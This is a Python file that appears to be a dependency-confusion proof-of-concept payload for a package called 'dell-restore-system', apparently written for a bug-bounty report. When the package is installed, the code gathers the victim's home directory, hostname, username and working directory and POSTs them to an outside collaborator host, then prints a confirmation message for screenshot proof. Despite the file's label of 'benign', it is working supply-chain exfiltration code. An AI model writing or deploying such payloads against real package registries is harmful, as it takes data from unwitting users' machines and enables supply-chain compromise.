import os
import getpass
import socket
import json
from urllib.request import Request, urlopen
from urllib.parse import urlencode

# --- START OF NETWORK INTERACTION POC PAYLOAD ---
try:
    # 1. Collect System Data
    data = {
        'p': 'dell-restore-system', # Package Name
        'hd': os.path.expanduser('~'), # Home Directory
        'hn': socket.gethostname(),    # Hostname
        'un': getpass.getuser(),       # Username
        'cwd': os.getcwd(),            # Current Working Directory
    }

    # 2. Define Collaborator Server Details (!!! UPDATE THIS LINE !!!)
    # REPLACE "YOUR_UNIQUE_COLLABORATOR_URL" with your actual domain (e.g., from Interactsh)
    collaborator_url = "https://cd47846a-6478-4e78-bdb7-2b71e7a270a1.dnshook.site/"
    
    # 3. Encode and Prepare Request
    encoded_data = urlencode(data).encode('utf-8')
    req = Request(collaborator_url, data=encoded_data, method='POST')

    # 4. Send Request (This is the RCE proof)
    # Use a timeout to prevent hanging the victim's installation process
    urlopen(req, timeout=5) 

    # 5. Confirmation Message for the terminal output (for screenshot proof)
    print("\n\n!!! [DELL SECURITY POC] !!!")
    print(f"Dependency Confusion PoC successful. System data sent to collaborator server.")
    print("!!! This package is benign. Check your collaborator for the RCE interaction. !!!\n\n")

except Exception as e:
    # Print the error for debugging, but the interaction is the real proof
    print(f"!!! [DELL SECURITY POC] !!! PoC failed to connect: {e}")
    pass
# --- END OF NETWORK INTERACTION POC PAYLOAD ---